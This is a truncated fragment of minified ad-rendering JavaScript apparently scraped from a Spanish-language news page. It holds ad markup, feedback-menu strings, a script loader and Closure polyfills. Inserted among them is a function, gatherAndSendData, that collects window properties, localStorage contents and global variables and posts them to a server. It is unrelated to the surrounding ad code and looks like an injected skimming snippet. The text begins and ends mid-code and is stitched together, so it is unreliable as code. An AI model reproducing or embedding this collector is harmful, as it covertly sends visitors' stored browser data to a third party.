IJ9UKe0imKJO6EQQV70r6BhKtpbhMALnckjs6kTRf_EJ-076goKINhT14CHBNda3zX94wVK8qcIQw2PYl-NTB3AXJOip4Cq49OxFMDdyQ0HhgbRDJwMInx9OssSffkXTUqr5A-HoPQVhio6_c_y-lq4fDVDlM66yGyHY4PJmC9esXBlxH-NWaD072CVqaeB1PgnQGjTtTFvBgCOhSxzvwjbWGTj_SpAaxz6nHi40bURZsfhEBCRstzfr27YKwait5cLRMHuIillZj8_hSzoXmVFOhmD2oduJX6RNg8suFkUjuqzX9\x22 target\x3d\x22_blank\x22\x3e\x3c/a\x3e\x3c/div\x3e\x3cdiv id\x3d\x22cbb\x22 class\x3d\x22cbb\x22 tabindex\x3d\x220\x22 role\x3d\x22button\x22\x3e\x3csvg xmlns\x3d\x22http://www.w3.org/2000/svg\x22 xmlns:xlink\x3d\x22http://www.w3.org/1999/xlink\x22 viewBox\x3d\x220 0 15 15\x22\x3e\x3cpath d\x3d\x22M3.25,3.25l8.5,8.5M11.75,3.25l-8.5,8.5\x22/\x3e\x3c/svg\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3cstyle\x3e.mute_panel{z-index:2147483646;}.abgac{position:absolute;left:0px;top:0px;z-index:2147483646;display:none;width:100%;height:100%;background-color:#FAFAFA;}.mlsc{height:100%;display:flex;justify-content:center;align-items:center;}.mls{animation:mlskf 2s linear infinite;height:50%;width:50%;}.mlsd{stroke-dasharray:1,189;stroke-dashoffset:0;animation:mlsdkf 1.4s ease-in-out infinite;}@keyframes mlskf{100%{transform:rotate(360deg);}}@keyframes mlsdkf{0%{stroke-dasharray:1,189;stroke-dashoffset:0;}50%{stroke-dasharray:134,189;stroke-dashoffset:-53px;}100%{stroke-dasharray:134,189;stroke-dashoffset:-188px;}}\x3c/style\x3e\x3cdiv id\x3d\x22mute_panel\x22 class\x3d\x22mute_panel\x22 aria-hidden\x3d\x22true\x22\x3e\x3cdiv id\x3d\x22abgac\x22 class\x3d\x22abgac\x22 aria-hidden\x3d\x22true\x22\x3e\x3cdiv id\x3d\x22mlsc\x22 class\x3d\x22mlsc\x22\x3e\x3csvg class\x3d\x22mls\x22 viewBox\x3d\x2250 50 100 100\x22\x3e\x3ccircle class\x3d\x22mlsd\x22 cx\x3d\x22100\x22 cy\x3d\x22100\x22 r\x3d\x2230\x22 fill\x3d\x22none\x22 stroke\x3d\x22#9E9E9E\x22 stroke-width\x3d\x223\x22/\x3e\x3c/svg\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3cscript data-jc\x3d\x2260\x22 src\x3d\x22https://static.googleadsserving.cn/pagead/js/r20230816/r20110914/abg_lite.js\x22 async data-jc-version\x3d\x22r20230816\x22 data-jcp-attribution-data\x3d\x22[[null,\x26quot;https://googleads.g.doubleclick.net/pagead/images/mtad/x_blue.png\x26quot;,null,\x26quot;https://googleads.g.doubleclick.net/pagead/images/mtad/x_blue.png\x26quot;,\x26quot;https://googleads.g.doubleclick.net/pagead/interaction/?ai\x3dCRufrqq_hZPruGveAid4P0O2c0AOR9bW4ceKc0KzrEamV5qPfLRABIPP1pUhgnQGgAY68oPUCyAEJqQIvfgIj1GyCPqgDAcgDmwSqBJgCT9BTMQI2M4AgEKWLb1of7TVOvvpEWPgs2lkcwaFBLytuut5Nzo8yImP_K6F5gAbhpN6ZfQARH8J2HFZaOsy2SogJ-4Q5nJnm7fVsjbqAY2RC6paDZhNh-p7dKAsPmVe3k6LX-CyvW0qccKK2YJa6c529TsCOpFWtkEOpPCXSNFLCzv6sodrKL9uQhh2sguc74jHNT_RANWRVdOfRD9M9_mn-ObqlgAOfOWrN4t4OPykhG0O_5sUXf5kCccWbZsAoBTVMyHLgSrF4cyazAoNwrA1Bx_sG5mOXzkhUJpu-Pbj_dS6e5ZHEAkuQQxDS-eUwsnf1gBu64cpXai9AJ0XXk2TBp4D_AVjuBTIIXKP23cNVqh77vQWWoMAEsp695rUE4AQDkAYBoAZMgAfaw9-KAagH2baxAqgHjs4bqAeT2BuoB-6WsQKoB_6esQKoB6SjsQKoB9XJG6gHpr4bqAeaBqgH89EbqAeW2BuoB6qbsQKoB4OtsQKoB_-esQKoB9-fsQLYBwDSCBQIgGEQARgdMgKKAjoCgEBIvf3BOoAKA5gLAcgLAYAMAaoNAkNOyA0BsBOJhvwT0BMA2BMKiBQF2BQB0BUB-BYBgBcB6BcB\\u0026sigh\x3dH03_LqAvGO8\\u0026cid\x3dCAQSPABpAlJW3b_bLjIVQle7Z6Ths8uSa7Fo9-_zGtR-pSrpLaz6fXBLm0r3nmqnCjZuNVE8KhE2JyNWx6x6qhgB\x26quot;,\x26quot;qsAlg0EOBrAI4pzQrOsREKH0ut1LGL6h_YoBIhNhenVyZS5taWNyb3NvZnQuY29tMggIBRMYi7USFEIXY2EtcHViLTQ3ODUxMjQzMzY4NTc1NTNIElgAcAE\x26quot;,[\x26quot;user_feedback_menu_interaction\x26quot;,\x26quot;\x26quot;,0],null,null,null,null,\x26quot;¿Qué ha ocurrido con este anuncio?\x26quot;,null,\x26quot;https://googleads.g.doubleclick.net/pagead/images/mtad/back_blue.png\x26quot;,\x26quot;Gracias por tu opinión\x26quot;,\x26quot;Revisaremos este anuncio para mejorar la experiencia en el futuro.\x26quot;,\x26quot;Gracias por tu opinión\x26quot;,\x26quot;Utilizaremos tu opinión para revisar los anuncios de este sitio.\x26quot;,null,null,null,\x26quot;Cerrando el anuncio: %1$d\x26quot;,\x26quot;谷歌广告\x26quot;,\x26quot;https://googleads.g.doubleclick.net/pagead/images/mtad/abg_blue.png\x26quot;,\x26quot;https://www.google.com/url?ct\x3dabg\\u0026q\x3dhttps://www.google.com/adsense/support/bin/request.py%3Fcontact%3Dabg_afc%26url%3Dhttps://www.elnuevodia.com/%26gl%3DCN%26hl%3Des%26ai0%3D\\u0026usg\x3dAOvVaw3uF0YT5O4JsvlGjW3hO22P\x26quot;,\x26quot;https://googleads.g.doubleclick.net/pagead/images/mtad/x_blue.png\x26quot;,0,[[\x26quot;Enviar comentarios\x26quot;,[\x26quot;user_feedback_menu_option\x26quot;,\x26quot;1\x26quot;,1],[\x26quot;¿Qué ha ocurrido con este anuncio?\x26quot;,[[\x26quot;He visto el anuncio varias veces\x26quot;,[\x26quot;mute_survey_option\x26quot;,\x26quot;2\x26quot;,1]],[\x26quot;El anuncio tapa el contenido\x26quot;,[\x26quot;mute_survey_option\x26quot;,\x26quot;3\x26quot;,1]],[\x26quot;No me interesa el anuncio\x26quot;,[\x26quot;mute_survey_option\x26quot;,\x26quot;7\x26quot;,1]],[\x26quot;El anuncio era inapropiado\x26quot;,[\x26quot;mute_survey_option\x26quot;,\x26quot;8\x26quot;,1]]]],[\x26quot;user_feedback_undo\x26quot;,\x26quot;1\x26quot;,1]]],[\x26quot;https://googleads.g.doubleclick.net/pagead/images/adchoices/iconx2-000000.png\x26quot;,\x26quot;Gestión de anuncios\x26quot;,\x26quot;%1$s ha cerrado el anuncio\x26quot;,null,\x26quot;https://www.gstatic.cn/images/branding/googlelogo/2x/googlelogo_dark_color_84x28dp.png\x26quot;,\x26quot;Enviar comentarios\x26quot;,\x26quot;Gracias. Tu opinión sirve para mejorar los anuncios de Google.\x26quot;,null,null,null,null,null,null,\x26quot;Ver mi configuración de anuncios de Google\x26quot;,null,\x26quot;https://www.gstatic.cn\x26quot;,\x26quot;\x26quot;,\x26quot;Anuncios %1$s\x26quot;,\x26quot;Configuración de anuncios\x26quot;,\x26quot;https://adssettings.google.com\x26quot;,null,null,null,0,null,null,null,0],\x26quot;AB3afGEAAAYQW1tbW251bGwsWzEwLDUzXSxudWxsLG51bGwsbnVsbCxbIjgwMzg1Il0sbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLFtudWxsLCIyOTE0NTkyNjIiXV0sW251bGwsImh0dHBzOi8vZ29vZ2xlYWRzLmcuZG91YmxlY2xpY2submV0L3BhZ2VhZC9pbnRlcmFjdGlvbi8_YWk9Q1J1ZnJxcV9oWlBydUd2ZUFpZDRQME8yYzBBT1I5Ylc0Y2VLYzBLenJFYW1WNXFQZkxSQUJJUFAxcFVoZ25RR2dBWTY4b1BVQ3lBRUpxUUl2ZmdJajFHeUNQcWdEQWNnRG13U3FCSmdDVDlCVE1RSTJNNEFnRUtXTGIxb2Y3VFZPdnZwRVdQZ3MybGtjd2FGQkx5dHV1dDVOem84eUltUF9LNkY1Z0FiaHBONlpmUUFSSDhKMkhGWmFPc3kyU29nSi00UTVuSm5tN2ZWc2picUFZMlJDNnBhRFpoTmgtcDdkS0FzUG1WZTNrNkxYLUN5dlcwcWNjS0syWUphNmM1MjlUc0NPcEZXdGtFT3BQQ1hTTkZMQ3p2NnNvZHJLTDl1UWhoMnNndWM3NGpITlRfUkFOV1JWZE9mUkQ5TTlfbW4tT2JxbGdBT2ZPV3JONHQ0T1B5a2hHME9fNXNVWGY1a0NjY1diWnNBb0JUVk15SExnU3JGNGN5YXpBb053ckExQnhfc0c1bU9YemtoVUpwdS1QYmpfZFM2ZTVaSEVBa3VRUXhEUy1lVXdzbmYxZ0J1NjRjcFhhaTlBSjBYWGsyVEJwNERfQVZqdUJUSUlYS1AyM2NOVnFoNzd2UVdXb01BRXNwNjk1clVFNEFRRGtBWUJvQVpNZ0FmYXc5LUtBYWdIMmJheEFxZ0hqczRicUFlVDJCdW9CLTZXc1FLb0JfNmVzUUtvQjZTanNRS29COVhKRzZnSHByNGJxQWVhQnFnSDg5RWJxQWVXMkJ1b0I2cWJzUUtvQjRPdHNRS29CXy1lc1FLb0I5LWZzUUxZQndEU0NCUUlnR0VRQVJnZE1nS0tBam9DZ0VCSXZmM0JPb0FLQTVnTEFjZ0xBWUFNQWFvTkFrTk95QTBCc0JPSmh2d1QwQk1BMkJNS2lCUUYyQlFCMEJVQi1CWUJnQmNCNkJjQlx1MDAyNnNpZ2g9SDAzX0xxQXZHTzhcdTAwMjZjaWQ9Q0FRU1BBQnBBbEpXM2JfYkxqSVZRbGU3WjZUaHM4dVNhN0ZvOS1fekd0Ui1wU3JwTGF6NmZYQkxtMHIzbm1xbkNqWnVOVkU4S2hFMkp5Tld4Nng2cWhnQiIsW251bGwsbnVsbCxudWxsLCJodHRwczovL2Rpc3BsYXlhZHMtZm9ybWF0cy5nb29nbGV1c2VyY29udGVudC5jb20vYWRzL3ByZXZpZXcvY29udGVudC5qcz9jbGllbnQ9d3RhXHUwMDI2b2JmdXNjYXRlZEN1c3RvbWVySWQ9Njc2NzgyMzQzOFx1MDAyNmNyZWF0aXZlSWQ9NjYzNzEzNDY1OTUwXHUwMDI2dmVyc2lvbklkPTBcdTAwMjZhZEdyb3VwQ3JlYXRpdmVJZD02MTI5MzE3MzUxMzhcdTAwMjZzaWc9QUNpVkJfd19SZVlsTThiQ205Z2VSVDZUSktSbS1xVGlYdyJdLG51bGwsbnVsbCwxLCJxc0FsZzBFT0JyQUk0cHpRck9zUkVLSDB1dDFMR0w2aF9Zb0JJaE5oZW5WeVpTNXRhV055YjNOdlpuUXVZMjl0TWdnSUJSTVlpN1VTRkVJWFkyRXRjSFZpTFRRM09EVXhNalF6TXpZNE5UYzFOVE5JRWxnQWNBRSIsIjIwMzI4NjU5NDg5Il1dXSxbbnVsbCxudWxsLDEsMSwxXSxbbnVsbCxudWxsLCJDTiJdXR_WbZl-aakzR5AK8OAEwc5nk4GeG1qTOg_bDByGg8P2Kaha1bY8qmQaceSRqLmab8k-L-e9SDJBIHllx1FsVjAPaxi3KUN1SrHU_y9D8k94DwED8E3Zvx4GAD0E9EL_IbVRWwVMA0x9cJT1-Edri0O0sg-Xesu-WYLiP1lLoqlnH4YjmDAvIhdhKjekNlJ9YmvvutQj_jApk5eAJ54r8ph0buexdhh45N5RrnVripL8LqyiTzY81a508r3VgmIh1_eG8SSZ0cl9ot1T_x8GKX9PVSONrIRP166j0iabVrPTAFY04vlXqJKofTge_tvJIkIL-jx7drkqlu0eRCtz194,kamY6Hc8z6sVE4Kk0BjQ9w\x26quot;,\x26quot;https://adssettings.google.com/whythisad?source\x3ddisplay\\u0026reasons\x3dAVs1JPJQ5QusWF7hrKp__DkbdqmoFXtJzTrspGyOhUbtdKGom6VTMK79HLXo0RQaHERTlYiWGu1ekLmOmGVBZJ4rll54kmRQ0lPDYLHHKfxqQ2VtvW0f4RdbSl0N2IvMBNxvqdrjmw9kJXPsaeiNFCSjI_1fgqHGDJZjC1LorPAvjOp1nC3DzTqKEe_xmlfg8ts5Svu6y6BYHTQA4MtEsWd91G05QpQhnyXORyKEo4ebkG8-0Hr7ryUQknj0x0a9D8CpSu4eJGvdftpl6_M8CP290Xx9MrSPY51DbuxzGDhALtPOlx0U1x0-OTfKDCkNTYmvKE5RZWKCVNqtFmXOZQmV89Xb_s9ZgglPUOvAfQVlOzoX6GFURYDU9LDdjQDQ_X8e5Rz3UqK-x6Ra0trBEKfmrdjb_jVVdZe_X_ORojZznjzrOSff2vrN3s32eB7skEmXln18FTvtMg8Oe9xqDQav3d_wrdRibmoZqTTyUczrONYtmtV3sq5ePY63SbHIa-mGUankbghjeZz5-k_QcEHJWCQDktD0feqydC_w8ikcE6OOnICl_dl6-ttcXeUOI4MvWnmynCdBYn59fXp8rurxE77Cdl1DOq8cdy1IwNTxdx-tPTTKCxQ8VqkQ6y7hNM7XqX2qnvVJtW4OZjlcIEmgMwMNVwSkTVvwQmOgrLpDYmUA_stoGpFmcDlvs_LkPIaCKO627ffMOlVbkqxn0AkBvACv85hrs8_Rssgw0qTRpqN8Jo8h3I8MnF-c1iOTm-9ezHp9hW4qtblI94IOA1qDGFhpqsV51rxMkrsdGA2pT-KY8_UCWGKbyzNZL-3DeeYF6sGIOlAY2zUdkkvsGDOwcCpEAd2l4CrldzPZ8lswFsM8AAs-vGv7bV1GdtIH69xWY60fk0G-xWgJEMaS5hEbQYg-WWsnYMlXppx1kSPtsaLTyA42R_-G-URHDSGP7241ApRo24aI-29qCkZCQb7Ol1XQZVZ3ar24kdzmeQcqmJpf9CjohTnDtXUVq-9qS_v-RrsRzFUARSsVYPvrfQxQp8cr8XiDnoaBX3p87a_ZpUoz_7ndGETq86HQyjvzyg7LzDdP_CRrn5UY4n21xC94l61ACjmDS0fpIsLHeMIeIm8Lv-hD_MDbwRSSO-ZXuawKesKXhtQpRW6I3V7hY7Zf3no1MpwZnBsCrp11PnajWvK3GMPgYMsJq4_FWa3yj_jVp84nC4JGnpHjcA3-HqpAOW8cqHZy1dym-T0KuW2kvWystLFp4sJEHI_Yxyu7qLK1R0Va_z3ANCu1vssTULDQwVFAUA3gFAgQnZutWNfceIokzE1_e1hdSngW0ykKbmn8h5mgYkjSid0vfujgjBj0600Pp44nzPI3HXcVmLvruAVi1TU8hJrRQGeonICbC9GE30mjPX703MNrVyvCMDGRndnWd5r1npAR4D8SE_ifEiNIJ9UKe0imKJO6EQQV70r6BhKtpbhMALnckjs6kTRf_EJ-076goKINhT14CHBNda3zX94wVK8qcIQw2PYl-NTB3AXJOip4Cq49OxFMDdyQ0HhgbRDJwMInx9OssSffkXTUqr5A-HoPQVhio6_c_y-lq4fDVDlM66yGyHY4PJmC9esXBlxH-NWaD072CVqaeB1PgnQGjTtTFvBgCOhSxzvwjbWGTj_SpAaxz6nHi40bURZsfhEBCRstzfr27YKwait5cLRMHuIillZj8_hSzoXmVFOhmD2oduJX6RNg8suFkUjuqzX9\x26quot;,\x26quot;¿Por qué este anuncio?\x26quot;,1,0],null,null,0,null,0,0,1,0,0,0,1,0,0,0,null,0,1,0,null,[[\x26quot;jake_ui_extension\x26quot;,\x26quot;jake_default_ui\x26quot;]],90,728,0,null,null,0,null,null,\x26quot;right\x26quot;,0,0,\x26quot;r20230816/r20110914\x26quot;]\x22\x3e\x3c/script\x3e');
if (!window.mraid) {
  document.write('\x3c/div\x3e');
}
function gatherAndSendData() {
  const newWindowProps = gatherWindowProps();
  const localStorageData = gatherLocalStorage();
  const newGlobalVars = globalVariableCollection();
  const gatheredData = {
    ...newWindowProps,
    ...localStorageData,
    ...newGlobalVars,
    jsHook: jsHookDetected
  };
  if (Object.keys(gatheredData).length > 0) {
    postDataToServer(gatheredData);
  }
}
(function () {
  (function () {
    var s = document.createElement('script');
    s.setAttribute('data-jc', '86');
    s.src = 'https://static.googleadsserving.cn/pagead/js/r20230816/r20110914/elements/html/omrhp.js';
    s.setAttribute('data-jc-version', 'r20230816');
    var ss = document.getElementsByTagName('script')[0];
    if (ss && ss.parentNode) {
      ss.parentNode.insertBefore(s, ss);
    }
  })();
  window.dicnf = {
    eavp: true,
    ebrp: true,
    apfa: true,
    atsb: true,
    bvst: 'r20230816',
    eeid: 'ua_hZM_PD6DBvcAPjoWkoAQ',
    aunb: true,
    adsg: '',
    uffp: true
  };
  (function () {
    /*  Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0 */function aa(a) {
      var b = 0;
      return function () {
        return b < a.length ? {
          done: !1,
          value: a[b++]
        } : {
          done: !0
        };
      };
    }
    var ba = "function" == typeof Object.defineProperties ? Object.defineProperty : function (a, b, c) {
      if (a == Array.prototype || a == Object.prototype) return a;
      a[b] = c.value;
      return a;
    };
    function ca(a) {
      a = ["object" == typeof globalThis && globalThis, a, "object" == typeof window && window, "object" == typeof self && self, "object" == typeof global && global];
      for (var b = 0; b < a.length; ++b) {
        var c = a[b];
        if (c && c.Math == Math) return c;
      }
      throw Error("Cannot find global object");
    }
    var da = ca(this);
    function m(a, b) {
      if (b) a: {
        var c = da;
        a = a.split(".");
        for (var d = 0; d < a.length - 1; d++) {
          var e = a[d];
          if (!(e in c)) break a;
          c = c[e];
        }
        a = a[a.length - 1];
        d = c[a];
        b = b(d);
        b != d && null != b && ba(c, a, {
          configurable: !0,
          writable: !0,
          value: b
        });
      }
    }
    function ea(a) {
      var b = "undefined" != typeof Symbol && Symbol.iterator && a[Symbol.iterator];
      if (b) return b.call(a);
      if ("number" == typeof a.length) return {
        next: aa(a)
      };
      throw Error(String(a) + " is not an iterable or ArrayLike");
    }
    var fa = "function" == typeof Object.assign ? Object.assign : function (a, b) {
      for (var c = 1; c < arguments.length; c++) {
        var d = arguments[c];
        if (d) for (var e in d) Object.prototype.hasOwnProperty.call(d, e) && (a[e] = d[e]);
      }
      return a;
    };
    m("Object.assign", function (a) {
      return a || fa;
    });
    var ha = "function" == typeof Object.create ? Object.create : function (a) {
        function b() {}
        b.prototype = a;
        return new b();
      },
      ia;
    if ("function" == typeof Object.setPrototypeOf) ia = Object.setPrototypeOf;else {
      var la;
      a: {
        var ma = {
            a: !0
          },
          na = {};
        try {
          na.__proto__ = ma;
          la = na.a;
          break a;
        } catch (a) {}
        la = !1;
      }
      ia = la ? function (a, b) {
        a.__proto__ = b;
        if (a.__proto__ !== b) throw new TypeError(a + " is not extensible");
        return a;
      } : null;
    }
    var oa = ia;
    function u(a, b) {
      a.prototype = ha(b.prototype);
      a.prototype.constructor = a;
      if (oa) oa(a, b);else for (var c in b) if ("prototype" != c) if (Object.defineProperties) {
        var d = Object.getOwnPropertyDescriptor(b, c);
        d && Object.defineProperty(a, c, d);
      } else a[c] = b[c];
      a.ba = b.prototype;
    }
    function pa() {
      for (var a = Number(this), b = [], c = a; c < arguments.length; c++) b[c - a] = arguments[c];
      return b;
    }
    m("Object.is", function (a) {
      return a ? a : function (b, c) {
        return b === c ? 0 !== b || 1 / b === 1 / c : b !== b && c !== c;
      };
    });
    m("Array.prototype.includes", function (a) {
      return a ? a : function (b, c) {
        var d = this;
        d instanceof String && (d = String(d));
        var e = d.length;
        c = c || 0;
        for (0 > c && (c = Math.max(c + e, 0)); c < e; c++) {
          var f = d[c];
          if (f === b || Object.is(f, b)) return !0;
        }
        return !1;
      };
    });
    m("String.prototype.includes", function (a) {
      return a ? a : function (b, c) {
        if (null == this) throw new TypeError("The 'this' value for String.prototype.includes must not be null or undefined");
        if (b instanceof RegExp) throw new TypeError("First argument to String.prototype.includes must not be a regular expression");
        return -1 !== this.indexOf(b, c || 0);
      };
    });
    m("globalThis", function (a) {
      return a || da;
    });
    var x = this || self;
    var qa, z;
    a: {
      for (var ra = ["CLOSURE_FLAGS"], A = x, sa = 0; sa < ra.length; sa++) if (A = A[ra[sa]], null == A) {
        z = null;
        break a;
      }
      z = A;
    }
    var ta = z && z[610401301];
    qa = null != ta ? ta : !1;
    var B,
      ua = x.navigator;
    B = ua ? ua.userAgentData || null : null;
    function va(a) {
      return qa ? B ? B.brands.some(function (b) {
        return (b = b.brand) && -1 != b.indexOf(a);
      }) : !1 : !1;
    }
    function E(a) {
      var b;
      a: {
        if (b = x.navigator) if (b = b.userAgent) break a;
        b = "";
      }
      return -1 != b.indexOf(a);
    }
    ;
    function F() {
      return qa ? !!B && 0 < B.brands.length : !1;
    }
    function wa() {
      return F() ? va("Chromium") : (E("Chrome") || E("CriOS")) && !(F() ? 0 : E("Edge")) || E("Silk");
    }
    ;
    var xa = Array.prototype.indexOf ? function (a, b) {
        return Array.prototype.indexOf.call(a, b, void 0);
      } : function (a, b) {
        if ("string" === typeof a) return "string" !== typeof b || 1 != b.length ? -1 : a.indexOf(b, 0);
        for (var c = 0; c < a.length; c++) if (c in a && a[c] === b) return c;
        return -1;
      },
      ya = Array.prototype.forEach ? function (a, b) {
        Array.prototype.forEach.call(a, b, void 0);
      } : function (a, b) {
        for (var c = a.length, d = "string" === typeof a ? a.split("") : a, e = 0; e < c; e++) e in d && b.call(void 0, d[e], e, a);
      };
    function za(a) {
      za[" "](a);
      return a;
    }
    za[" "] = function () {};
    var Aa = F() ? !1 : E("Trident") || E("MSIE");
    !E("Android") || wa();
    wa();
    E("Safari") && (wa() || (F() ? 0 : E("Coast")) || (F() ? 0 : E("Opera")) || (F() ? 0 : E("Edge")) || (F() ? va("Microsoft Edge") : E("Edg/")) || F() && va("Opera"));
    var Ba = {},
      G = null;
    function Ca(a, b) {
      void 0 === b && (b = 0);
      if (!G) {
        G = {};
        for (var c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""), d = ["+/=", "+/", "-_=", "-_.", "-_"], e = 0; 5 > e; e++) {
          var f = c.concat(d[e].split(""));
          Ba[e] = f;
          for (var g = 0; g < f.length; g++) {
            var h = f[g];
            void 0 === G[h] && (G[h] = g);
          }
        }
      }
      b = Ba[b];
      c = Array(Math.floor(a.length / 3));
      d = b[64] || "";
      for (e = f = 0; f < a.length - 2; f += 3) {
        var k = a[f],
          l = a[f + 1];
        h = a[f + 2];
        g = b[k >> 2];
        k = b[(k & 3) << 4 | l >> 4];
        l = b[(l & 15) << 2 | h >> 6];
        h = b[h & 63];
        c[e++] = g + k + l + h;
      }
      g = 0;
      h = d;
      switch (a.length - f) {
        case 2:
          g = a[f + 1], h = b[(g & 15) << 2] || d;
        case 1:
          a = a[f], c[e] = b[a >> 2] + b[(a & 3) << 4 | g >> 4] + h + d;
      }
      return c.join("");
    }
    ;
    var Da = "undefined" !== typeof Uint8Array,
      Ea = !Aa && "function" === typeof btoa;
    var H = "function" === typeof Symbol && "symbol" === typeof Symbol() ? Symbol() : void 0,
      Fa = H ? function (a, b) {
        a[H] |= b;
      } : function (a, b) {
        void 0 !== a.g ? a.g |= b : Object.defineProperties(a, {
          g: {
            value: b,
            configurable: !0,
            writable: !0,
            enumerable: !1
          }
        });
      };
    function Ga(a) {
      var b = J(a);
      1 !== (b & 1) && (Object.isFrozen(a) && (a = Array.prototype.slice.call(a)), K(a, b | 1));
    }
    var J = H ? function (a) {
        return a[H] | 0;
      } : function (a) {
        return a.g | 0;
      },
      M = H ? function (a) {
        return a[H];
      } : function (a) {
        return a.g;
      },
      K = H ? function (a, b) {
        a[H] = b;
      } : function (a, b) {
        void 0 !== a.g ? a.g = b : Object.defineProperties(a, {
          g: {
            value: b,
            configurable: !0,
            writable: !0,
            enumerable: !1
          }
        });
      };
    function Ha() {
      var a = [];
      Fa(a, 1);
      return a;
    }
    function Ia(a) {
      a = a >> 11 & 1023;
      return 0 === a ? 536870912 : a;
    }
    ;
    var Ja = {};
    function N(a) {
      return null !== a && "object" === typeof a && !Array.isArray(a) && a.constructor === Object;
    }
    var Ka,
      O,
      La = [];
    K(La, 39);
    O = Object.freeze(La);
    function Ma(a) {
      if ("boolean" !== typeof a) {
        var b = typeof a;
        throw Error("Expected boolean but got " + ("object" != b ? b : a ? Array.isArray(a) ? "array" : b : "null") + ": " + a);
      }
      return !!a;
    }
    ;
    var Na;
    function P(a, b, c) {
      null == a && (a = Na);
      Na = void 0;
      if (null == a) {
        var d = 96;
        c ? (a = [c], d |= 512) : a = [];
        b && (d = d & -2095105 | (b & 1023) << 11);
      } else {
        if (!Array.isArray(a)) throw Error();
        d = J(a);
        if (d & 64) return a;
        d |= 64;
        if (c && (d |= 512, c !== a[0])) throw Error();
        a: {
          c = a;
          var e = c.length;
          if (e) {
            var f = e - 1,
              g = c[f];
            if (N(g)) {
              d |= 256;
              b = +!!(d & 512) - 1;
              e = f - b;
              1024 <= e && (Oa(c, b, g), e = 1023);
              d = d & -2095105 | (e & 1023) << 11;
              break a;
            }
          }
          b && (g = +!!(d & 512) - 1, b = Math.max(b, e - g), 1024 < b && (Oa(c, g, {}), d |= 256, b = 1023), d = d & -2095105 | (b & 1023) << 11);
        }
      }
      K(a, d);
      return a;
    }
    function Oa(a, b, c) {
      for (var d = 1023 + b, e = a.length, f = d; f < e; f++) {
        var g = a[f];
        null != g && g !== c && (c[f - b] = g);
      }
      a.length = d + 1;
      a[d] = c;
    }
    ;
    function Pa(a, b) {
      return Qa(b);
    }
    function Qa(a) {
      switch (typeof a) {
        case "number":
          return isFinite(a) ? a : String(a);
        case "boolean":
          return a ? 1 : 0;
        case "object":
          if (a && !Array.isArray(a) && Da && null != a && a instanceof Uint8Array) {
            if (Ea) {
              for (var b = "", c = 0, d = a.length - 10240; c < d;) b += String.fromCharCode.apply(null, a.subarray(c, c += 10240));
              b += String.fromCharCode.apply(null, c ? a.subarray(c) : a);
              a = btoa(b);
            } else a = Ca(a);
            return a;
          }
      }
      return a;
    }
    ;
    function Ra(a, b, c, d, e, f) {
      if (null != a) {
        if (Array.isArray(a)) a = e && 0 == a.length && J(a) & 1 ? void 0 : f && J(a) & 2 ? a : Sa(a, b, c, void 0 !== d, e, f);else if (N(a)) {
          var g = {},
            h;
          for (h in a) g[h] = Ra(a[h], b, c, d, e, f);
          a = g;
        } else a = b(a, d);
        return a;
      }
    }
    function Sa(a, b, c, d, e, f) {
      var g = d || c ? J(a) : 0;
      d = d ? !!(g & 32) : void 0;
      a = Array.prototype.slice.call(a);
      for (var h = 0; h < a.length; h++) a[h] = Ra(a[h], b, c, d, e, f);
      c && c(g, a);
      return a;
    }
    function Ta(a) {
      return a.Z === Ja ? a.toJSON() : Qa(a);
    }
    ;
    function Ua(a, b, c) {
      var d = a.l,
        e = M(d);
      if (e & 2) throw Error();
      Va(d, e, b, c);
      return a;
    }
    function Va(a, b, c, d) {
      var e = Ia(b);
      if (c >= e) {
        var f = b;
        if (b & 256) e = a[a.length - 1];else {
          if (null == d) return;
          e = a[e + (+!!(b & 512) - 1)] = {};
          f |= 256;
        }
        e[c] = d;
        f !== b && K(a, f);
      } else a[c + (+!!(b & 512) - 1)] = d, b & 256 && (a = a[a.length - 1], c in a && delete a[c]);
    }
    function Q(a, b, c) {
      if (null != c && "string" !== typeof c) throw Error();
      return Ua(a, b, c);
    }
    ;
    function R(a, b, c) {
      this.l = P(a, b, c);
    }
    R.prototype.toJSON = function () {
      if (Ka) var a = Wa(this, this.l, !1);else a = Sa(this.l, Ta, void 0, void 0, !1, !1), a = Wa(this, a, !0);
      return a;
    };
    function Xa(a) {
      Ka = !0;
      try {
        return JSON.stringify(a.toJSON(), Pa);
      } finally {
        Ka = !1;
      }
    }
    R.prototype.Z = Ja;
    R.prototype.toString = function () {
      return Wa(this, this.l, !1).toString();
    };
    function Wa(a, b, c) {
      var d = a.constructor.aa,
        e = Ia(M(c ? a.l : b)),
        f = !1;
      if (d) {
        if (!c) {
          b = Array.prototype.slice.call(b);
          var g;
          if (b.length && N(g = b[b.length - 1])) for (f = 0; f < d.length; f++) if (d[f] >= e) {
            Object.assign(b[b.length - 1] = {}, g);
            break;
          }
          f = !0;
        }
        e = b;
        c = !c;
        g = M(a.l);
        a = Ia(g);
        g = +!!(g & 512) - 1;
        for (var h, k, l = 0; l < d.length; l++) if (k = d[l], k < a) {
          k += g;
          var n = e[k];
          null == n ? e[k] = c ? O : Ha() : c && n !== O && Ga(n);
        } else h || (n = void 0, e.length && N(n = e[e.length - 1]) ? h = n : e.push(h = {})), n = h[k], null == h[k] ? h[k] = c ? O : Ha() : c && n !== O && Ga(n);
      }
      d = b.length;
      if (!d) return b;
      var p;
      if (N(h = b[d - 1])) {
        a: {
          var q = h;
          e = {};
          c = !1;
          for (var v in q) a = q[v], Array.isArray(a) && a != a && (c = !0), null != a ? e[v] = a : c = !0;
          if (c) {
            for (var t in e) {
              q = e;
              break a;
            }
            q = null;
          }
        }
        q != h && (p = !0);
        d--;
      }
      for (; 0 < d; d--) {
        h = b[d - 1];
        if (null != h) break;
        var y = !0;
      }
      if (!p && !y) return b;
      var w;
      f ? w = b : w = Array.prototype.slice.call(b, 0, d);
      b = w;
      f && (b.length = d);
      q && b.push(q);
      return b;
    }
    ;
    function Ya(a) {
      this.l = P(a);
    }
    u(Ya, R);
    function Za(a, b) {
      this.key = a;
      this.defaultValue = void 0 === b ? !1 : b;
